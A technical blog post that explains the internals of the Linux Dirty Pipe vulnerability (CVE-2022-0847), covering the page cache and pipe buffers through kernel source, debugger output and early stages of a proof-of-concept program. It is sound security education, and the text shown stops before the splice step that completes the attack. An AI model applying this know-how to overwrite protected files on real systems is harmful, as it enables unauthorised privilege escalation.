+++
title = "Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)"
date = "2022-06-06T19:57:03+02:00"
author = "Valentin Obst and Martin Clauß"
authorTwitter = "" #do not include @
cover = ""
tags = ["Linux", "kernel", "LPE", "pipe", "splice", "page cache", "debugging"]
keywords = ["Linux", "kernel", "LPE", "pipe", "splice", "page cache", "debugging"]
description = ""
showFullContent = false
readingTime = false
+++

## Intro

This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described [here](https://dirtypipe.cm4all.com/). If you haven't read the original publication yet, we'd suggest that you read it first (maybe also twice ;)). While Kellermann's post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what's going on we'd like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code ([elixir.bootlin.com](https://elixir.bootlin.com/linux/v5.17.9/source), version  5.17.9) and a kernel debugging setup (derived from [linux-kernel-debugging](https://github.com/martinclauss/linux-kernel-debugging)). The Dirty Pipe-specific debugging setup and the PoC code is provided in a [GitHub](https://github.com/vobst/lkd-cve) repository.

## Our Goal / Disclaimer

It's important to talk about the goal of our investigation first:
- Do we want to understand how the Linux kernel works in general? Maybe not right now...
- Do we want to know what the vulnerability is? Why it occurs? How it can be exploited? Yes!

It is important to keep in mind, what we want to achieve. The Linux kernel is a **very** complex piece of software. We have to leave some blind spots, but that's **absolutely okay** :)

Thus, when we show kernel source code we will often hide parts that are not directly relevant for our discussion to improve readability. In general, those parts may very well be security-relevant and we encourage you to follow the links to review the original code. In particular, if you want to find your own vulnerabilities or become a kernel hacker you should spend more time to understand (all) the mechanisms and details! ;)

## Page Cache

The page cache plays an important role in the Dirty Pipe vulnerability so let's see what it is and how it works first.

> The physical memory is volatile and the common case for getting data into the memory is to read it from files. Whenever a file is read, the data is put into the page cache to avoid expensive disk access on the subsequent reads. Similarly, when one writes to a file, the data is placed in the page cache and eventually gets into the backing storage device. The written pages are marked as dirty and when Linux decides to reuse them for other purposes, it makes sure to synchronize the file contents on the device with the updated data. [source](https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html#page-cache)

In particular, the above means that if any process on the system (or the kernel itself) requests data from a file that is already cached, the cached data is used instead of accessing the disk. Of course there are ways to influence this behavior by using flags (`O_DIRECT | O_SYNC`) when opening a file, or by explicitly instructing the kernel to `sync`hronize dirty pages. You could also discard the cached pages using the `sysfs` pseudo file system: `# echo 1 > /proc/sys/vm/drop_caches`. However, in most situations the cached data is what is ultimately used by the kernel (and thus also the user processes).

At this point we can already tease what the Dirty Pipe vulnerability is all about: It will allow us to overwrite the cached data of any file that we are allowed to **open** (read-only access is sufficient), without the page cache actually marking the overwritten page as 'dirty'. Thus, we can trick the system into thinking that the file contents changed (at least for a while) without leaving traces on disk.

But let's not get ahead of ourselves, the goal is after all to understand *why* this happens. As we can see, the first thing our PoC does, is opening a file for reading, without any additional flags.

```c
int tfd;
...
pause_for_inspection("About to open() file");
tfd = open("./target_file", O_RDONLY);
```
[`⬀ go to source code`](https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L61)

The kernel function handling our `open` user space call is `do_sys_openat2()`. It attempts to get the file in the desired mode, and if everything succeeds it installs a new file descriptor that is backed by the file and returns it (the file descriptor is just an `int`eger).

```c
static long
do_sys_openat2(int dfd, const char __user *filename, struct open_how *how)
{
	struct open_flags op;
	int fd = build_open_flags(how, &op);
	struct filename *tmp;
...
    tmp = getname(filename);
...
	fd = get_unused_fd_flags(how->flags);
...
	struct file *f = do_filp_open(dfd, tmp, &op); // lolcads: maybe follow ... but don't get lost ;)
...
	if (IS_ERR(f)) { // e.g. permission checks failed, doesn't exist...
		put_unused_fd(fd);
		fd = PTR_ERR(f);
	} else {
		fsnotify_open(f);
		fd_install(fd, f);
	}
	putname(tmp);
    return fd; // lolcads: breakpoint 1
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1198)

Following the call to `do_filp_open()` bears the danger of getting lost in the jungle of the (virtual) file system. To avoid going down that rabbit hole we place our first breakpoint on the `return` statement. This gives us the opportunity to find the `struct file` that is backing the file descriptor our PoC process receives. 
```c
struct file {
...
	struct path                     f_path;
	struct inode	            	*f_inode;
	const struct file_operations	*f_op;
...
	struct address_space        	*f_mapping;
...
};
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L956)

Importantly, the `f_mapping` field leads us to the `struct address_space` that represents the page cache object associated to the file. The `a_ops` field points to implementations of typical operations one might want to perform on a page cache object e.g., reading ahead, marking pages as dirty or writing back dirty pages, and so on.
```c
struct address_space {
	struct inode		*host;
	struct xarray		i_pages;
...
	unsigned long		nrpages;
	pgoff_t                 writeback_index;
	const struct address_space_operations *a_ops;
	unsigned long		flags;
...
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L450)

The actual cached data lies on one or more pages somewhere in physical memory. Each and every page of physical memory is described by a `struct page`. An [extendable array](https://lwn.net/Articles/745073/) (`struct xarray`) containing pointers to those page structs can be found in the `i_pages` field of the `struct address_space`.
```c
struct page {
	unsigned long flags;
...
    /* Page cache and anonymous pages */
	struct address_space *mapping;
	pgoff_t index;		/* Our offset within mapping. */
...
	/*
	 * If the page can be mapped to userspace, encodes the number
	 * of times this page is referenced by a page table.
	 */
	atomic_t _mapcount;
	/*
	 * If the page is neither PageSlab nor mappable to userspace,
	 * the value stored here may help determine what this page
	 * is used for.  See page-flags.h for a list of page types
	 * which are currently stored here.
	 */
	unsigned int page_type;
...
	/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */
	atomic_t _refcount;
...
	/*
	 * On machines where all RAM is mapped into kernel address space,
	 * we can simply calculate the virtual address. On machines with
	 * highmem some memory is mapped into kernel virtual memory
	 * dynamically, so we need a place to store that address.
	 * Note that this field could be 16 bits on x86 ... ;)
	 *
	 * Architectures with slow multiplication can define
	 * WANT_PAGE_VIRTUAL in asm/page.h
	 */
	void *virtual;	/* Kernel virtual address (NULL if
					   not kmapped, ie. highmem) */
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm_types.h#L72)

The last comment gives a hint at how to find the actual page of physical memory described by this struct within the kernel's virtual address space. (The kernel maps all of physical memory into its virtual address space so we know its *somewhere*. Refer to the [documentation](https://elixir.bootlin.com/linux/v5.17.9/source/Documentation/x86/x86_64/mm.rst) for more details.)
```
========================================================================================================================
      Start addr    |   Offset   |     End addr     |  Size   | VM area description 
========================================================================================================================
...
   ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
...
```
The key to finding the 'needle in the haystack' is another region of the kernel's virtual address space.

> The sparse vmemmap uses a virtually mapped memory map to optimize pfn_to_page and page_to_pfn operations. There is a global struct page *vmemmap pointer that points to a virtually contiguous array of struct page objects. A PFN is an index to that array and the offset of the struct page from vmemmap is the PFN of that page. [source](https://www.kernel.org/doc/html/latest/vm/memory-model.html)

```
========================================================================================================================
      Start addr    |   Offset   |     End addr     |  Size   | VM area description
========================================================================================================================
...
   ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
   ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
   ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
...
```
In the debugger we can confirm that the address of the `struct page` associated to the `struct address_space` of the `target_file` our `poc` process opened indeed lies within this range.
```
struct task_struct at 0xffff888103a71c80
> 'pid': 231
> 'comm': "poc", '\000' <repeats 12 times>

struct file at 0xffff8881045b0800
> 'f_mapping': 0xffff8881017d9460
> filename: target_file

struct address_space at 0xffff8881017d9460
> 'a_ops': 0xffffffff82226ce0 <ext4_aops>
> 'i_pages.xa_head' : 0xffffea0004156880                <- here!

```
The kernel implements the translation of this address into a position in the contiguous mapping of all physical memory using a series of macros that hide behind a call to [`lowmem_page_address / page_to_virt`](https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm.h#L1712).
```c
#define page_to_virt(x) __va(PFN_PHYS(page_to_pfn(x)))
    #define page_to_pfn __page_to_pfn
        #define __page_to_pfn(page) (unsigned long)((page) - vmemmap) // (see .config: CONFIG_SPARSEMEM_VMEMMAP=y)
            #define vmemmap ((struct page *)VMEMMAP_START)
                # define VMEMMAP_START      vmemmap_base // (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
    #define PFN_PHYS(x) ((phys_addr_t)(x) << PAGE_SHIFT)
        #define PAGE_SHIFT      12
    #define __va(x)         ((void *)((unsigned long)(x)+PAGE_OFFSET))
        #define PAGE_OFFSET     ((unsigned long)__PAGE_OFFSET)
            #define __PAGE_OFFSET           page_offset_base // (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
```
When following the macros, make sure to consider your architecture (e.g., x86) and check for compile time definitions in the `.config` file of your build (e.g., `CONFIG_DYNAMIC_MEMORY_LAYOUT=y`). The values of `vmemmap_base` and `page_offset_base` are in general effected by [KASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization#Kernel_address_space_layout_randomization) but can be determined at runtime e.g., by using the debugger.

Equipped with this knowledge, we can [script the debugger](https://github.com/vobst/lkd-cve/blob/main/lkd_scripts_gdb/lkd/structs.py#L158) to do this calculation for us and print the cached data of the file we opened.
```
struct page at 0xffffea0004156880
> virtual: 0xffff8881055a2000
> data: b'File owned by root!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

Inspecting the file permissions confirms that we are indeed not allowed to write to it. 

```-rw-r--r-- 1 root root 20 May 19 20:15 target_file```

Next, we are going to explore the second kernel subsystem involved in the Dirty Pipe vulnerability.

## Pipes (general)

Pipes are a unidirectional inter-process communication (IPC) mechanism found in UNIX-like operating systems. In essence, a pipe is a buffer in kernel space that is accessed by processes through file descriptors. Unidirectionality means that there are two types of file descriptors, *read* and *write* ones:

```c
int pipefds[2];
pipe(pipefds);
```

```
                         ┌───────────────────┐
 write() ---> pipefds[1] │>>>>>>>>>>>>>>>>>>>│ pipefds[0] ---> read()
                         └───────────────────┘
```

Upon creating a pipe the calling process receives both file descriptors, but usually it proceeds by distributing one or both of the file descriptors to other processes (e.g., by `fork/clone`ing or through UNIX domain `socket`s) to facilitate IPC. They are, for example, used by shells to connect stdout and stdin of the launched sub-processes.

```
$ strace -f sh -c 'echo "Hello world" | wc' 2>&1 | grep -E "(pipe|dup2|close|clone|execve|write|read)"
...
sh: pipe([3, 4]) = 0                              // parent shell creates pipe
sh: clone(...)                                    // spawn child shell that will do echo (build-in command)
sh: close(4) = 0                                  // parent shell does not need writing end anymore
echo sh: close(3)                                 // close reading end
echo sh: dup2(4, 1) = 0                           // set stdout equal to writing end
echo sh: close(4)                                 // close duplicate writing end
echo sh: write(1, "Hello world\n", 12) = 12       // child shell performs write to pipe
...
sh: clone(...)                                    // spawn child shell that will later execve wc
sh: close(3) = 0                                  // parent shell does not need reading end anymore
...
wc sh: dup2(3, 0) = 0                             // set stdin equal to reading end
wc sh: close(3) = 0                               // close duplicate reading end
wc sh: execve("/usr/bin/wc", ["wc"],...)          // exec wc
wc: read(0, "Hello world\n", 16384) = 12          // wc reads from pipe
...
```

We mostly care about anonymous pipes as seen in the example above but there are also named pipes (see, e.g., [here](https://www.linuxjournal.com/article/2156))

Check out the excellent book *The Linux Programming Interface* by Michael Kerrisk, Chapter 44 "Pipes and FIFOs" for more information and examples.

## Pipes (initialization)

After opening the target file, our PoC process proceeds by creating a pipe:

```c
int pipefds[2];
...
pause_for_inspection("About to create pipe()");
if (pipe(pipefds)) {
    exit(1);
}
```
[`⬀ go to source code`](https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L70)

Let's investigate what the kernel does to provide the pipe functionality.

### Overview

Our system call is handled by the kernel function `do_pipe2`.

```c
SYSCALL_DEFINE1(pipe, int __user *, fildes)
{
	return do_pipe2(fildes, 0);
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1026)
```c
static int do_pipe2(int __user *fildes, int flags)
{
	struct file *files[2];
	int fd[2];
	int error;

	error = __do_pipe_flags(fd, files, flags); // mc: follow me
	if (!error) {
		if (unlikely(copy_to_user(fildes, fd, sizeof(fd)))) {
			fput(files[0]);
			fput(files[1]);
			put_unused_fd(fd[0]);
			put_unused_fd(fd[1]);
			error = -EFAULT;
		} else {
			fd_install(fd[0], files[0]);
			fd_install(fd[1], files[1]);
		}
	}
	return error;
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1004)

Here we can see that two integer file descriptors, backed by two distinct files, are created. One for the reading `fd[0]`, and one for the writing `fd[1]` end of the pipe. The descriptors are also copied from the kernel to user space `copy_to_user(fildes, fd, sizeof(fd))`, where `fildes` is the user space pointer we specified with the call to `pipe(pipefds)` in our PoC. 

Following the call to `__do_pipe_flags()` reveals which data structures the kernel uses to implement our pipe. We summarized the relevant structures and their relationships in the following figure:

[comment]: (https://asciiflow.com/#/share/eJzlV81q4zAQfhWh41LCdg9lG8ht2VNpoJdlwSDcWOoKXNvICv2HUnrcQw%2Bhu89S8jR5kpXiPzmxZEVR0oUaJXY8QvPNN%2FNJkzuYhJcYDpNpHB%2FAOLzBDA7hXQCvAzg8%2Fnp0EMAb8fTl%2BFA8cXzNxY8Agr1fi9nvxezRabwEQbIrUHMvo1jp9W0xe8o5m044yGiG0fmUEMzES7sAfKGpMBld%2FHkW3ypYmqSR%2FCZpFZD4PA0Gg7UlesNpIXl9A40nQmO8OlW3hMEKVIhZeIHBCJwKAWwE0ejfBto6N6vQdOx9lzREOJ%2FQjKcM8PBcoUWB1u3BB2tzVzHO98HsLxxGIqWf9fC7ZCah0UQUWVTPVsvuE2mBI0XFbyG7rfjvKg0ZgN9NoARqmxNzUDyksTkrXVKUQTXBLmevxq5m5VLmZATAGJ19G5%2Be%2FAT3y%2BkNPJfIt8rIOk4d%2BG4fbdzykKiqtyjAFkxGkwuU01vJweFRF0znIUKRciERYuWKBDEpNKAhtXJt3IU662ZD5stXih8r5muTT6nUwFpRtwLq3fedN9eXJkdXdY6uGOXYmCPT5SE%2FFj1NnzJ2kiGKJCL9%2BoVrATjfFgIwnOX9e1szLHohbb60NCsGq27IrCWjSauN8m5QBjBxaIvAbScq756qT641cxX4X%2Bt%2FAkZTowCSZsbgrP35aIe6yK91uP%2Fhh2ugPQ1qUbc1jdIMs5DTNMnX17PPR9kIjdGPM6UPcivovkCdUTqYTDp2xrHpH6U%2BmysOj8PkRrZtSHQFopEbFcdy1ci54Ha4vHPnhmHZGhVElDxUzdL%2BMNjO2yUGv3pyw2A7b5cY8iymk6oIRkAWBlpuyarhA%2FDwP9TDO5z38AE%2B%2FAPppUGL)
```
                                                                                                                  ┌──────────────────┐
                                                                                      ┌──────────────────────┐  ┌►│struct pipe_buffer│
                                   ┌────────────────────────┐                     ┌──►│struct pipe_inode_info│  │ │...               │
                             ┌───► │struct file             │                     │   │                      │  │ │page = Null       │
                             │     │                        │                     │   │...                   │  │ │...               │
File desciptor table         │     │...                     │                     │   │                      │  │ ├──────────────────┤
                             │     │                        │                     │   │head = 0              │  │ │struct pipe_buffer│
int fd    │  struct file *f  │     │f_inode  ───────────────┼──┐                  │   │                      │  │ │...               │
──────────┼───────────────── │     │                        │  │                  │   │tail = 0              │  │ │page = Null       │
...       │  ...             │     │fmode =  O_RDONLY | ... │  │  ┌─────────────┐ │   │                      │  │ │...               │
          │                  │     │                        │  ├─►│struct inode │ │   │ring_size = 16        │  │ ├──────────────────┤
pipefd_r  │  f_read    ──────┘     │...                     │  │  │             │ │   │                      │  │ │       ...        │
          │                        └────────────────────────┘  │  │...          │ │   │...                   │  │ ├──────────────────┤
pipefd_w  │  f_write   ──────┐                                 │  │             │ │   │                      │  │ │struct pipe_buffer│
          │                  │     ┌────────────────────────┐  │  │i_pipe  ─────┼─┘   │bufs ─────────────────┼──┘ │...               │
...       │  ...             └───► │struct file             │  │  │             │     │                      │    │page = Null       │
          │                        │                        │  │  │...          │     │...                   │    │...               │
          │                        │...                     │  │  │             │     └──────────────────────┘    └──────────────────┘
                                   │                        │  │  │i_fop  ──────┼─┐
                                   │f_inode  ───────────────┼──┘  │             │ │   ┌─────────────────────────────────────┐
                                   │                        │     │...          │ └──►│struct file_operations               │
                                   │fmode = O_WRONLY | ...  │     └─────────────┘     │                                     │
                                   │                        │                         │...                                  │
                                   │...                     │                         │                                     │
                                   └────────────────────────┘                         │read_iter  = pipe_read               │
                                                                                      │                                     │
                                                                                      │write_iter = pipe_write              │
                                                                                      │                                     │
                                                                                      │...                                  │
                                                                                      │                                     │
                                                                                      │splice_write = iter_file_splice_write│
                                                                                      │                                     │
                                                                                      │...                                  │
                                                                                      └─────────────────────────────────────┘
```                                           
The two integer file descriptors, representing the pipe in user space, are backed by two `struct file`s that only differ in their permission bits. In particular, they both refer to the same `struct inode`.

> The inode (index node) is a data structure in a Unix-style file system that describes a file-system object such as a file or a directory. Each inode stores the attributes and disk block locations of the object's data. File-system object attributes may include metadata (times of last change, access, modification), as well as owner and permission data.
[...]
A directory is a list of inodes with their assigned names. The list includes an entry for itself, its parent, and each of its children. [source](https://en.wikipedia.org/wiki/Inode)

The `i_fop` field of the inode contains a pointer to a `struct file_operations`. This structure holds function pointers to the implementations of the various operations that can be performed on the pipe. Importantly, those include the functions the kernel will use to handle a process' request to `read()` or `write()` the pipe.
```c
const struct file_operations pipefifo_fops = {
	.open		= fifo_open,
	.llseek		= no_llseek,
	.read_iter	= pipe_read,
	.write_iter	= pipe_write,
	.poll		= pipe_poll,
	.unlocked_ioctl	= pipe_ioctl,
	.release	= pipe_release,
	.fasync		= pipe_fasync,
	.splice_write	= iter_file_splice_write,
};
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1218)

As stated above, an inode is not limited to describing pipes, and for other file types this field would point to another set of function pointers / implementations.

The pipe-specific part of the inode is mostly contained in the `struct pipe_inode_info` pointed to by the `i_pipe` field.

```c
/**
 *	struct pipe_inode_info - a linux kernel pipe
 *	@mutex: mutex protecting the whole thing
 *	@rd_wait: reader wait point in case of empty pipe
 *	@wr_wait: writer wait point in case of full pipe
 *	@head: The point of buffer production
 *	@tail: The point of buffer consumption
 *	@note_loss: The next read() should insert a data-lost message
 *	@max_usage: The maximum number of slots that may be used in the ring
 *	@ring_size: total number of buffers (should be a power of 2)
 *	@nr_accounted: The amount this pipe accounts for in user->pipe_bufs
 *	@tmp_page: cached released page
 *	@readers: number of current readers of this pipe
 *	@writers: number of current writers of this pipe
 *	@files: number of struct file referring this pipe (protected by ->i_lock)
 *	@r_counter: reader counter
 *	@w_counter: writer counter
 *	@poll_usage: is this pipe used for epoll, which has crazy wakeups?
 *	@fasync_readers: reader side fasync
 *	@fasync_writers: writer side fasync
 *	@bufs: the circular array of pipe buffers
 *	@user: the user who created this pipe
 *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that
 **/
struct pipe_inode_info {
	struct mutex mutex;
	wait_queue_head_t rd_wait, wr_wait;
	unsigned int head;
	unsigned int tail;
	unsigned int max_usage;
	unsigned int ring_size;
#ifdef CONFIG_WATCH_QUEUE
	bool note_loss;
#endif
	unsigned int nr_accounted;
	unsigned int readers;
	unsigned int writers;
	unsigned int files;
	unsigned int r_counter;
	unsigned int w_counter;
	unsigned int poll_usage;
	struct page *tmp_page;
	struct fasync_struct *fasync_readers;
	struct fasync_struct *fasync_writers;
	struct pipe_buffer *bufs;
	struct user_struct *user;
#ifdef CONFIG_WATCH_QUEUE
	struct watch_queue *watch_queue;
#endif
};
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L58)

At this point we can get a first idea of how pipes are implemented. On a high level, the kernel thinks of a pipe as a circular array of `pipe_buffer` structures (sometimes also called a ring). The `bufs` field is a pointer to the start of this array.

```c
/**
 *	struct pipe_buffer - a linux kernel pipe buffer
 *	@page: the page containing the data for the pipe buffer
 *	@offset: offset of data inside the @page
 *	@len: length of data inside the @page
 *	@ops: operations associated with this buffer. See @pipe_buf_operations.
 *	@flags: pipe buffer flags. See above.
 *	@private: private data owned by the ops.
 **/
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;                       
	unsigned long private;
};
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L26)

There are two positions in this array: one for writing to (the `head`) - and one for reading from (the `tail`) the pipe. The `ring_size` defaults to `16` and will always be a power of 2, which is why circularity is implemented by masking index accesses with `ring_size - 1` (e.g., `bufs[head & (ring_size - 1)]`). The `page` field is a pointer to a `struct page` describing where the actual data held by the `pipe_buffer` is stored. We will elaborate more on the process of adding and consuming data below. Note that each `pipe_buffer` has one page associated which means that the total capacity of the pipe is `ring_size * 4096 bytes (4KB)`.

A process can get and set the size of this ring using the `fcntl()` system call with the `F_GETPIPE_SZ` and `F_SETPIPE_SZ` flags, respectively. Our PoC sets the size of its pipe to a single buffer (4KB / one page) for simplicity.

```c
void
setup_pipe(int pipefd_r, int pipefd_w) {
    if (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) {
        exit(1);
    }
...
}
```
[`⬀ go to source code`](https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L48)


### Code

We can also follow the setup of the pipe in the kernel source code. The initialization of the integer file descriptors happens in `__do_pipe_flags()`.

```c
static int __do_pipe_flags(int *fd, struct file **files, int flags)
{
	int error;
	int fdw, fdr;
...
	error = create_pipe_files(files, flags);
...
	fdr = get_unused_fd_flags(flags);
...
	fdw = get_unused_fd_flags(flags);
...
	audit_fd_pair(fdr, fdw);
	fd[0] = fdr;
	fd[1] = fdw;
	return 0;
...
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L954)

The backing files are initialized in `create_pipe_files()`. We can see that both files are identical up to permissions, contain a reference to the pipe in their private data, and are opened as [streams](https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1423).

```c
int create_pipe_files(struct file **res, int flags)
{
	struct inode *inode = get_pipe_inode();
	struct file *f;
	int error;
...
	f = alloc_file_pseudo(inode, pipe_mnt, "",
				O_WRONLY | (flags & (O_NONBLOCK | O_DIRECT)),
				&pipefifo_fops);
...

	f->private_data = inode->i_pipe;

	res[0] = alloc_file_clone(f, O_RDONLY | (flags & O_NONBLOCK),
				  &pipefifo_fops);
...
	res[0]->private_data = inode->i_pipe;
	res[1] = f;
	stream_open(inode, res[0]);
	stream_open(inode, res[1]);
	return 0;
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L911)

The initialization of the common inode structure happens in `get_pipe_inode()`. We can see that an inode is created and also information for the pipe is allocated and stored such that `inode->i_pipe` can later be used to access the pipe from a given inode. Furthermore, `inode->i_fops` specifies the implementations used for file operations on a pipe.

```c
static struct inode *get_pipe_inode(void)
{
	struct inode *inode = new_inode_pseudo(pipe_mnt->mnt_sb);
	struct pipe_inode_info *pipe;
...
	inode->i_ino = get_next_ino();

	pipe = alloc_pipe_info();
...
	inode->i_pipe = pipe;
	pipe->files = 2;
	pipe->readers = pipe->writers = 1;
	inode->i_fop = &pipefifo_fops; // lolcads: see description below

	/*
	 * Mark the inode dirty from the very beginning,
	 * that way it will never be moved to the dirty
	 * list because "mark_inode_dirty()" will think
	 * that it already _is_ on the dirty list.
	 */
	inode->i_state = I_DIRTY;
	inode->i_mode = S_IFIFO | S_IRUSR | S_IWUSR;
	inode->i_uid = current_fsuid();
	inode->i_gid = current_fsgid();
	inode->i_atime = inode->i_mtime = inode->i_ctime = current_time(inode);

	return inode;
...
}
```

[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L871)

Most of the pipe-specific setup happens is `alloc_pipe_info()`. Here you can see the actual creation of the pipe, not just the inode, but the `pipe_buffer`s / `pipe_inode_info->bufs` that hold the content / data of the pipe.

```c
struct pipe_inode_info *alloc_pipe_info(void)
{
	struct pipe_inode_info *pipe;
	unsigned long pipe_bufs = PIPE_DEF_BUFFERS; // lolcads: defaults to 16
	struct user_struct *user = get_current_user();
	unsigned long user_bufs;
	unsigned int max_size = READ_ONCE(pipe_max_size);

	pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); // lolcads: allocate the inode info
...
	pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), // lolcads: allocate the buffers with the page references
			     GFP_KERNEL_ACCOUNT);

	if (pipe->bufs) { // mc: set up the rest of the relevant fields
		init_waitqueue_head(&pipe->rd_wait);
		init_waitqueue_head(&pipe->wr_wait);
		pipe->r_counter = pipe->w_counter = 1;
		pipe->max_usage = pipe_bufs;
		pipe->ring_size = pipe_bufs;
		pipe->nr_accounted = pipe_bufs;
		pipe->user = user;
		mutex_init(&pipe->mutex);
		return pipe;
	}
...
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L782)

### Debugger

We can print a summary of the freshly initialized pipe (after resizing it) by breaking at the end of `pipe_fcntl()`, which is the handler invoked in the `case F_SETPIPE_SZ:` of the switch statement inside [`do_fcntl()`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1392).

```
struct pipe_inode_info at 0xffff8881044aec00
> 'head': 0
> 'tail': 0
> 'ring_size': 1
> 'bufs': 0xffff888101f8a180

struct pipe_buffer at 0xffff888101f8a180
> 'page': NULL
> 'offset': 0
> 'len': 0
> 'ops': NULL
> 'flags':
```
There's not much to see yet, but we keep this as a reference to see how things evolve over time.

## Pipes (reading/writing)

### Writing

After allocating the pipe, the PoC proceeds by writing to it.

```c
void
fill_pipe(int pipefd_w) {
    for (int i = 1; i <= PAGESIZE / 8; i++) {
        if (i == 1) {
            pause_for_inspection("About to perform first write() to pipe");
        }
        if (i == PAGESIZE / 8) {
            pause_for_inspection("About to perform last write() to pipe");
        }
        if (write(pipefd_w, "AAAAAAAA", 8) != 8) {
            exit(1);
        }
    }
}
```
[`⬀ go to source code`](https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L18)


By looking at the file operations of a pipe inode we can see that `write`s to a pipe are handled by `pipe_write()`. When data is moved across the kernel-user-space boundary (or within the kernel) one frequently encounters vectorized I/O using [`iov_iter`](https://lwn.net/Articles/625077/) objects. For our purposes we can think of them as buffers but feel free to follow the links to learn more (also [this](https://en.wikipedia.org/wiki/Vectored_I/O)).

```c=
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
	struct file *filp = iocb->ki_filp;
	struct pipe_inode_info *pipe = filp->private_data;
	unsigned int head;
	ssize_t ret = 0;
	size_t total_len = iov_iter_count(from);
	ssize_t chars;
	bool was_empty = false;
...
	/*
	 * If it wasn't empty we try to merge new data into
	 * the last buffer.
	 *
	 * That naturally merges small writes, but it also
	 * page-aligns the rest of the writes for large writes
	 * spanning multiple pages.
	 */
	head = pipe->head;
	was_empty = pipe_empty(head, pipe->tail);
	chars = total_len & (PAGE_SIZE-1);
	if (chars && !was_empty) {
		unsigned int mask = pipe->ring_size - 1;
		struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];
		int offset = buf->offset + buf->len;

		if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
		    offset + chars <= PAGE_SIZE) {
...
			ret = copy_page_from_iter(buf->page, offset, chars, from);
...
			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
	}

	for (;;) {
...
		head = pipe->head;
		if (!pipe_full(head, pipe->tail, pipe->max_usage)) {
			unsigned int mask = pipe->ring_size - 1;
			struct pipe_buffer *buf = &pipe->bufs[head & mask];
			struct page *page = pipe->tmp_page;
			int copied;

			if (!page) {
				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
...
				pipe->tmp_page = page;
			}

			/* Allocate a slot in the ring in advance and attach an
			 * empty buffer.  If we fault or otherwise fail to use
			 * it, either the reader will consume it or it'll still
			 * be there for the next write.
			 */
			spin_lock_irq(&pipe->rd_wait.lock);

			head = pipe->head;
			if (pipe_full(head, pipe->tail, pipe->max_usage)) {
				spin_unlock_irq(&pipe->rd_wait.lock);
				continue;
			}

			pipe->head = head + 1;
			spin_unlock_irq(&pipe->rd_wait.lock);

			/* Insert it into the buffer array */
			buf = &pipe->bufs[head & mask];
			buf->page = page;
			buf->ops = &anon_pipe_buf_ops;
			buf->offset = 0;
			buf->len = 0;
			if (is_packetized(filp))
				buf->flags = PIPE_BUF_FLAG_PACKET;
			else
				buf->flags = PIPE_BUF_FLAG_CAN_MERGE;
			pipe->tmp_page = NULL;

			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
...
			ret += copied;
			buf->offset = 0;
			buf->len = copied;

			if (!iov_iter_count(from))
				break;
		}

		if (!pipe_full(head, pipe->tail, pipe->max_usage))
			continue;
...
	}
out:
...
	return ret;
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L416)

